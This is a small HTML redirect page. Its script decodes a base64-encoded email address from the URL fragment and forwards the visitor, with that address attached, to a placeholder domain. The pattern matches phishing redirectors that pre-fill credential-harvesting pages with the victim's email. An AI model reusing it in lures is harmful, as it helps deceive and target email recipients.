<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    function isBase64(str) {
      try {
        const decoded = atob(str);
        // Check for valid email format after decoding
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded);
      } catch (e) {
        return false;
      }
    }

    window.onload = function () {
      const hash = decodeURIComponent(window.location.hash.substring(1)).trim();
      const baseUrl = "http://newdomain.com/#";

      if (!hash) {
        window.location.href = baseUrl;
        return;
      }

      let email = hash;

      if (isBase64(hash)) {
        email = atob(hash);
      }

      const finalUrl = baseUrl + encodeURIComponent(email);
      window.location.href = finalUrl;
    };
  </script>
</head>
<body>
  <p>Redirecting... If it doesn't happen automatically, <a id="manualLink" href="#">click here</a>.</p>
</body>
</html>
